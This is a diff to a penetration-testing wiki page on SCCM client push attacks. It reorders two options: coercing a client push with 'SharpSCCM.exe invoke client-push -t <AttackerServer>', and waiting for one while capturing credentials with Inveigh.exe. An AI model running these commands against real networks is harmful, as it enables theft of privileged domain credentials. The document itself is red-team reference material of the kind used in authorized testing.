@@ -328,17 +328,8 @@ In some case, the "Client Push Accounts" could even be part of the Domain Admins
 The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.
 
 {% tabs %}
-{% tab title="Wait" %}
-**Option 1: Wait for Client Push Installation**
-
-```powershell
-# Credential capture using Inveigh 
-Inveigh.exe
-```
-{% endtab %}
-
 {% tab title="Coerce" %}
-**Option 2: Forcefully "coerce" the Client Push Installation**
+**Option 1: Forcefully "coerce" the Client Push Installation**
 
 {% hint style="danger" %}
 Important note: You want to read [this blog](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) post before you continue this route, as this attack might leave traces behind and might junk up the SCCM environment.
@@ -373,6 +364,15 @@ SharpSCCM.exe invoke client-push -t <AttackerServer>
 **Step 3: Cleanup**
 
 If you run the above SharpSCCM command with the `--as-admin` parameter (cause you have admin privileges over the MP), there's nothing to do. Otherwise get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t <AttackerServer>` parameter. This is the device name that will appear in SCCM.
+{% endtab %}
+
+{% tab title="Wait" %}
+**Option 2: Wait for Client Push Installation**
+
+```powershell
+# Credential capture using Inveigh 
+Inveigh.exe
+```
 {% endtab %}
 {% endtabs %}
 
